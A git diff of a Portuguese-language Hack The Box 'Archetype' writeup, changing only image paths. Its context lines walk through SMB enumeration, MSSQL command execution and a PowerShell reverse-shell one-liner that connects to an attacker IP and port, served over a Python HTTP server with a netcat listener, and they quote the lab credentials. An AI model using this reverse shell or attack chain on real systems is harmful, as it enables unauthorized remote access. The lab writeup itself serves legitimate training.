@@ -4,11 +4,11 @@ author: Hastur
 date: 2021-09-05 21:00:00 -0300
 categories: [Writeups, Hack The Box]
 tags: [HTB, Starting point, Windows, Very Easy, MSSQL]
-image: /htb/htb-archetype-logo.png
+image: /img/htb/htb-archetype-logo.png
 alt: "HTB Archetype Writeup"
 ---
 
-<img src="/htb/htb-archetype-logo.png">
+<img src="/img/htb/htb-archetype-logo.png">
 
 <br>
 
@@ -105,27 +105,27 @@ Encontramos várias portas abertas nesta máqina, vamo começar pela `445 - SMB`
 
 Vamos tentar uma conex]ao sem credenciais para verificar null session no SMB.
 
-<img src="/htb/htb-archetype-1.png">
+<img src="/img/htb/htb-archetype-1.png">
 
 Temos acesso a algubs compartilhamentos, em expecial `backups`, vamos enumerá-lo.
 
-<img src="/htb/htb-archetype-2.png">
+<img src="/img/htb/htb-archetype-2.png">
 
 Encontramos o arquivo, `prod.dtsConfig`, após baixarmos, e analizarmos, encontramos algumas informaçõs valiosas.
 
-<img src="/htb/htb-archetype-3.png">
+<img src="/img/htb/htb-archetype-3.png">
 
 Ecnontramos as credenciais para um MSSQL: `ARCHETYPE\sql_svc:M3g4c0rp123`.
 
 Em posse das credenciais, podemos tentar uma conex]ao remota utilizando o `mssqlclient.py`.
 
-<img src="/htb/htb-archetype-4.png">
+<img src="/img/htb/htb-archetype-4.png">
 
 Conseguimos um acesso ao MSSQL, ótimo!
 
 Podemos utilizar a função `IS_SRVROLEMEMBER`, para verificar se o usuário `sql_svc` tem privilégios administrativos.
 
-<img src="/htb/htb-archetype-5.png">
+<img src="/img/htb/htb-archetype-5.png">
 
 O MSSQL retornou `1`, o que significa que temos privilégios administrativos.
 
@@ -135,7 +135,7 @@ Existe uma funsão do MSSQL que permite executar comandos via query, podemos enc
 
 Vamos seguir os passos da documentação e testar algum comando.
 
-<img src="/htb/htb-archetype-6.png">
+<img src="/img/htb/htb-archetype-6.png">
 
 Ótimo, conseguimos um RCE através do MSSQL, agora podemos tentar um reverse shell através de comandos no PowerSHell.
 
@@ -148,51 +148,51 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.14.251",8443);$stream =
 ```
 Agora vamos iniciar um server http com python `python3 -m http.server 80`.
 
-<img src="/htb/htb-archetype-7.png">
+<img src="/img/htb/htb-archetype-7.png">
 
 Agora setamos um `netcat` na porta 8443 que setamos em nosso payload.
 
-<img src="/htb/htb-archetype-8.png">
+<img src="/img/htb/htb-archetype-8.png">
 
 Com tudo pronto, podemos enviar um payload em Power Shell no MSSQL, que vai fazer o download do script em nosso HTTP server e em seguida executá-lo, nos dando um reverse shell no netcat que abrimos.
 
-<img src="/htb/htb-archetype-9.png">
+<img src="/img/htb/htb-archetype-9.png">
 
 Se olharmos em nosso servidor HTTP, podemos ver que houve uma requisição vinda da Archetype.
 
-<img src="/htb/htb-archetype-10.png">
+<img src="/img/htb/htb-archetype-10.png">
 
 E em nosso netcat, temos nosso reverse shell!!!
 
-<img src="/htb/htb-archetype-11.png">
+<img src="/img/htb/htb-archetype-11.png">
 
 Ótimo, estamos dentro do host da Archetype, dentro do Desktop do usuário `sql_svc`, encontramos a flag do usuário.
 
-<img src="/htb/htb-archetype-12.png">
+<img src="/img/htb/htb-archetype-12.png">
 
 ## Escalação de privilégios
 
 Após um bom tempo de enumeração local, decidi checar se há algum histórico do Power Shell no usuário e descobri uma informação extremamente importante.
 
-<img src="/htb/htb-archetype-13.png">
+<img src="/img/htb/htb-archetype-13.png">
 
 Encontramos as credenciais do administrador: `administrator:MEGACORP_4dm1n!!`.
 
 Em posse destas credenciais, podemos tentar um acesso remoto ao host utilizando o `psexec.py`.
 
-<img src="/htb/htb-archetype-14.png">
+<img src="/img/htb/htb-archetype-14.png">
 
 E conseguimos nosso shell com privilégios administrativos no Host Archetype.
 
 A flag do Administrator está em seu Desktop.
 
-<img src="/htb/htb-archetype-15.png">
+<img src="/img/htb/htb-archetype-15.png">
 
 
 E comprometemos o server!!
 <br>
 
-<img src="/htb/hackerman.gif">
+<img src="/img/htb/hackerman.gif">
 <br>
 
 
